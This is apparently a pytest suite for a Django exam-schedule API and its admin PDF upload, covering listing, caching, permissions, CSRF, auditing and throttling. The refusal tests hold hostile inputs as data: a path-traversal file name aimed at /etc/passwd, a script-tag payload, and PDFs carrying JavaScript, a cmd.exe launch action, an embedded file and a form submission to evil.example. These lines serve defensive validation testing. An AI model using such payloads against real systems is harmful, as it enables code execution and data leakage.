# ruff: noqa: F811 -- imported pytest fixtures are re-named as test arguments
"""The exam routine: the public schedule of exams and the routine PDF (admin uploads, anyone
reads). The PDF goes through checks before it is stored and is served only by the API."""

import json
from datetime import timedelta

import pytest
from django.core.files.storage import default_storage
from django.core.files.uploadedfile import SimpleUploadedFile
from django.utils import timezone
from rest_framework.test import APIClient

from apps.accounts.models import Role, User
from apps.audit.models import AuditLog
from apps.exams.models import Exam, RoutinePdf
from tests.test_exams import admin_user, api, make_exam, subject  # noqa: F401

pytestmark = pytest.mark.django_db

ROUTINE = "/api/v1/public/routine/"
PDF_URL = "/api/v1/public/routine/pdf/"
ADMIN_PDF = "/api/v1/admin/routine/pdf/"
GOOD_PDF = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"


def pdf_upload(data=GOOD_PDF, name="routine.pdf"):
    return SimpleUploadedFile(name, data, content_type="application/pdf")


def upload(api, data=GOOD_PDF, name="routine.pdf"):
    return api.post(ADMIN_PDF, {"file": pdf_upload(data, name)}, format="multipart")


def scheduled(subject, hours_from_now, length_hours=2, **extra):
    now = timezone.now()
    start = now + timedelta(hours=hours_from_now)
    return make_exam(
        subject,
        publish=True,
        start_at=start,
        end_at=start + timedelta(hours=length_hours),
        **extra,
    )


def slugs(response):
    assert response.status_code == 200, response.content
    return [row["slug"] for row in response.json()["exams"]]


# --------------------------------------------------------------------------------------
# The schedule
# --------------------------------------------------------------------------------------
def test_the_routine_lists_upcoming_and_live_exams_earliest_first(subject):
    later = scheduled(subject, 48, title_en="Later", title_bn="পরে")
    live = scheduled(subject, -1, length_hours=3, title_en="Live now", title_bn="চলছে")
    soon = scheduled(subject, 5, title_en="Soon", title_bn="শীঘ্রই")
    assert slugs(APIClient().get(ROUTINE)) == [live.slug, soon.slug, later.slug]


def test_ended_unscheduled_and_unpublished_exams_are_not_in_it(subject):
    kept = scheduled(subject, 3)
    ended = scheduled(subject, 3, title_en="Ended", title_bn="শেষ")
    Exam.objects.filter(pk=ended.pk).update(
        start_at=timezone.now() - timedelta(hours=10), end_at=timezone.now() - timedelta(hours=9)
    )
    make_exam(subject, publish=True, title_en="Any time", title_bn="যেকোনো সময়")  # no start time
    hidden = make_exam(subject, title_en="Draft", title_bn="খসড়া")
    hidden.start_at = timezone.now() + timedelta(hours=1)
    hidden.end_at = hidden.start_at + timedelta(hours=1)
    hidden.save()
    assert slugs(APIClient().get(ROUTINE)) == [kept.slug]


def test_an_exam_with_no_end_time_stays_for_a_day_after_it_starts(subject):
    recent = make_exam(subject, publish=True, start_at=timezone.now() - timedelta(hours=5))
    make_exam(
        subject,
        publish=True,
        title_en="Old",
        title_bn="পুরনো",
        start_at=timezone.now() - timedelta(days=3),
    )
    assert slugs(APIClient().get(ROUTINE)) == [recent.slug]


def test_each_row_has_what_the_schedule_shows(subject):
    exam = scheduled(subject, 4)
    row = APIClient().get(ROUTINE, HTTP_ACCEPT_LANGUAGE="en").json()["exams"][0]
    for key in (
        "slug", "title", "category", "subject", "start_at", "end_at", "duration_minutes",
        "total_marks", "total_questions", "exam_type", "access_type",
    ):  # fmt: skip
        assert key in row, key
    assert row["slug"] == exam.slug and row["title"] == "Physics Model Test"
    assert row["category"]["slug"] == "science"
    # No answer data, no internal ids, no syllabus (that is on the exam's own page).
    dumped = json.dumps(row)
    for secret in ("is_correct", "explanation", "public_id", "created_by", '"id"', "syllabus"):
        assert secret not in dumped, secret


def test_the_title_follows_the_request_language(subject):
    scheduled(subject, 4)
    client = APIClient()
    assert client.get(ROUTINE, HTTP_ACCEPT_LANGUAGE="bn").json()["exams"][0]["title"] == (
        "পদার্থবিজ্ঞান মডেল টেস্ট"
    )


def test_no_login_is_needed_and_an_empty_routine_is_an_empty_list():
    body = APIClient().get(ROUTINE).json()
    assert body["exams"] == [] and body["pdf"]["available"] is False


def test_the_routine_costs_a_fixed_number_of_queries(subject, django_assert_max_num_queries):
    for hours in range(1, 9):
        scheduled(subject, hours * 3, title_en=f"E{hours}", title_bn=f"ই{hours}")
    APIClient().get(ROUTINE)
    with django_assert_max_num_queries(6):
        assert len(APIClient().get(ROUTINE).json()["exams"]) == 8


# --------------------------------------------------------------------------------------
# The PDF: publishing
# --------------------------------------------------------------------------------------
def test_an_admin_publishes_a_pdf_and_anyone_can_read_it(api):
    response = upload(api)
    assert response.status_code == 200, response.content
    info = response.json()
    assert info["available"] is True and info["name"] == "routine.pdf"
    assert info["size_bytes"] == len(GOOD_PDF)
    served = APIClient().get(PDF_URL)
    assert served.status_code == 200
    assert b"".join(served.streaming_content) == GOOD_PDF
    assert served["Content-Type"] == "application/pdf"
    assert served["X-Content-Type-Options"] == "nosniff"
    assert served["Content-Security-Policy"] == "default-src 'none'"
    assert "inline" in served["Content-Disposition"]
    assert APIClient().get(ROUTINE).json()["pdf"]["available"] is True


def test_repeat_downloads_use_the_etag(api):
    upload(api)
    first = APIClient().get(PDF_URL)
    etag = first["ETag"]
    again = APIClient().get(PDF_URL, HTTP_IF_NONE_MATCH=etag)
    assert again.status_code == 304
    upload(api, GOOD_PDF + b"%% a different file\n%%EOF\n")
    assert APIClient().get(PDF_URL, HTTP_IF_NONE_MATCH=etag).status_code == 200


def test_replacing_the_pdf_removes_the_old_file(api, django_capture_on_commit_callbacks):
    with django_capture_on_commit_callbacks(execute=True):
        upload(api)
    first = RoutinePdf.objects.get().file.name
    assert default_storage.exists(first)
    with django_capture_on_commit_callbacks(execute=True):
        upload(api, GOOD_PDF + b"\n% second\n%%EOF\n")
    second = RoutinePdf.objects.get().file.name
    assert second != first
    assert default_storage.exists(second) and not default_storage.exists(first)


def test_removing_it_ends_the_download(api, django_capture_on_commit_callbacks):
    upload(api)
    name = RoutinePdf.objects.get().file.name
    with django_capture_on_commit_callbacks(execute=True):
        response = api.delete(ADMIN_PDF)
    assert response.status_code == 200 and response.json()["available"] is False
    assert APIClient().get(PDF_URL).status_code == 404
    assert not default_storage.exists(name)
    assert api.get(ADMIN_PDF).json()["available"] is False


def test_with_nothing_published_the_download_is_a_clean_404():
    assert APIClient().get(PDF_URL).status_code == 404


def test_the_stored_name_is_random_and_never_from_the_upload(api):
    upload(api, name="../../etc/passwd.pdf")
    stored = RoutinePdf.objects.get()
    assert stored.file.name.startswith("documents/") and ".." not in stored.file.name
    assert stored.file.name.endswith(".pdf") and "passwd" not in stored.file.name


# --------------------------------------------------------------------------------------
# The PDF: what is refused
# --------------------------------------------------------------------------------------
def code_of(response):
    assert response.status_code == 400, response.content
    return response.json()["error"]["code"]


@pytest.mark.parametrize(
    ("data", "code"),
    [
        (b"<html><script>alert(1)</script></html>", "file_not_pdf"),
        (b"MZ\x90\x00 an executable", "file_not_pdf"),
        (b"%PDF-1.4\nno end marker at all", "file_not_pdf"),
        (
            b"%PDF-1.4\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n%%EOF",
            "pdf_active_content",
        ),
        (b"%PDF-1.4\n<< /S /Launch /F (cmd.exe) >>\n%%EOF", "pdf_active_content"),
        (b"%PDF-1.4\n<< /Type /EmbeddedFile >>\n%%EOF", "pdf_active_content"),
        (b"%PDF-1.4\n<< /S /SubmitForm /F (http://evil.example) >>\n%%EOF", "pdf_active_content"),
    ],
)
def test_a_file_that_is_not_a_plain_pdf_is_refused_whatever_its_name(api, data, code):
    assert code_of(upload(api, data, name="routine.pdf")) == code
    assert not RoutinePdf.current()


def test_size_limits(api, settings):
    settings.DOCUMENT_MAX_BYTES = 100
    assert code_of(upload(api, GOOD_PDF + b"x" * 200 + b"\n%%EOF")) == "file_too_large"
    assert upload(api, b"%PDF-1.1\n%%EOF\n").status_code == 200


def test_missing_and_empty_uploads_are_clean_400s(api):
    assert api.post(ADMIN_PDF, {}, format="multipart").status_code == 400
    assert (
        api.post(
            ADMIN_PDF, {"file": SimpleUploadedFile("a.pdf", b"")}, format="multipart"
        ).status_code
        == 400
    )


def test_a_refused_upload_keeps_the_published_pdf(api):
    upload(api)
    before = RoutinePdf.objects.get().file.name
    assert code_of(upload(api, b"not a pdf")) == "file_not_pdf"
    assert RoutinePdf.objects.get().file.name == before
    assert APIClient().get(PDF_URL).status_code == 200


# --------------------------------------------------------------------------------------
# Who may, audit, abuse
# --------------------------------------------------------------------------------------
def test_only_an_admin_can_publish_or_remove(subject):
    student = User.objects.create_user(
        "01712340055", password="Strong-Pass-2026", full_name="S", role=Role.STUDENT
    )
    for client in (APIClient(), _login(student)):
        assert client.post(ADMIN_PDF, {"file": pdf_upload()}, format="multipart").status_code in (
            401,
            403,
        )
        assert client.delete(ADMIN_PDF).status_code in (401, 403)
        assert client.get(ADMIN_PDF).status_code in (401, 403)
    assert RoutinePdf.current() is None


def _login(user):
    client = APIClient()
    client.force_login(user)
    return client


def test_a_cross_site_upload_without_the_csrf_token_is_refused(admin_user):
    client = APIClient(enforce_csrf_checks=True)
    client.force_login(admin_user)
    response = client.post(ADMIN_PDF, {"file": pdf_upload()}, format="multipart")
    assert response.status_code == 403 and RoutinePdf.current() is None


def test_each_change_is_audited_without_the_file(api):
    upload(api, name="very-private-name.pdf")
    api.delete(ADMIN_PDF)
    entries = AuditLog.objects.filter(entity_type="exams.routine_pdf")
    assert {entry.action for entry in entries} == {"routine.pdf_set", "routine.pdf_remove"}
    blob = json.dumps(list(entries.values()), default=str)
    assert "%PDF" not in blob and "very-private-name" not in blob


def test_uploads_are_limited_per_admin(api, settings):
    settings.AUTH_THROTTLE_RATES = {**settings.AUTH_THROTTLE_RATES, "document_upload": "2/hour"}
    codes = [upload(api).status_code for _ in range(3)]
    assert codes == [200, 200, 429]
